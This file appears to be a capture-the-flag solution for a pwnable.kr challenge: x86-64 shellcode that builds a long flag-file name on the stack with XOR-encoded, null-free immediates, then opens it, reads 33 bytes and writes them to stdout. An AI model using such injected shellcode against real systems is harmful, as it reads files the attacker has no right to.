.text:
    global _start

_start:
    ; open(file='this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong', oflag=0, mode=0) 
    ; push b'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00' 
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x676e6f306f306f
    xor [rsp], rax
    mov rax, 0x306f306f306f306f
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x303030306f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f3030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x3030303030303030
    push rax
    mov rax, 0x303030306f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6f6f6f6f6f6f6f6f
    push rax
    mov rax, 0x6c5f797265765f73
    push rax
    mov rax, 0x695f656d616e5f65
    push rax
    mov rax, 0x6c69665f6568745f
    push rax
    mov rax, 0x7972726f732e656c
    push rax
    mov rax, 0x69665f736968745f
    push rax
    mov rax, 0x646165725f657361
    push rax
    mov rax, 0x656c705f656c6966
    push rax
    mov rax, 0x5f67616c665f726b
    push rax
    mov rax, 0x2e656c62616e7770
    push rax
    mov rax, 0x5f73695f73696874
    push rax
    mov rdi, rsp
    xor edx, edx ; 0 
    xor esi, esi ; 0 
    ; call open() 
    push 2
    pop rax
    syscall
    sub rsp, 33
    mov rbx, rsp
    add rbx, 33
    ; call read('rax', 'rbx', 0x21) 
    mov rdi, rax
    xor eax, eax ; SYS_read 
    push 0x21
    pop rdx
    mov rsi, rbx
    syscall
    ; write(fd=1, buf='rbx', n=0x21) 
    push 1
    pop rdi
    push 0x21
    pop rdx
    mov rsi, rbx
    ; call write() 
    push 1
    pop rax
    syscall